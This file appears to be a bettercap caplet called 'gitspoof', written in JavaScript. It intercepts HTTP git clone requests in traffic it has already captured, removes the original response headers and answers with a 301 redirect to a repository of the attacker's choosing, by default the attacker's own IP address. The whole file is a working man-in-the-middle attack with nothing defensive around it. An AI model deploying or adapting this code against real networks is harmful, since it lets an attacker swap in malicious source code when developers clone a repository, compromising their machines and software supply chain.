var gitspoof_repo = undefined;

var red    = "\033[31m",
    yellow = "\033[33m",
    green  = "\033[32m",
    bold   = "\033[1;37m",
    reset  = "\033[0m"

function onLoad() {
    env("gitspoof.repo") ? gitspoof_repo = env("gitspoof.repo") : gitspoof_repo = env("iface.ipv4");
    log( "Gitspoof loaded" );
    log(green +"Git redirect to repo: " + yellow + gitspoof_repo + "/" + reset);
}

function onResponse(req, res) {
    if (req.Query == 'service=git-upload-pack') {
        log(bold + "Got git clone request, attempting redirect" + reset);
    }
    if (req.Query == 'service=git-upload-pack' && req.Hostname != gitspoof_repo) {
        res.Status = 301;
        headers = res.Headers.split("\r\n");
        for (var i = 0; i < headers.length; i++) {
            header_name = headers[i].replace(/:.*/, "");
            res.RemoveHeader(header_name);
        }
        res.SetHeader("Location", "http://" + gitspoof_repo + "/info/refs?service=git-upload-pack");
        res.Body = "";
    }
}
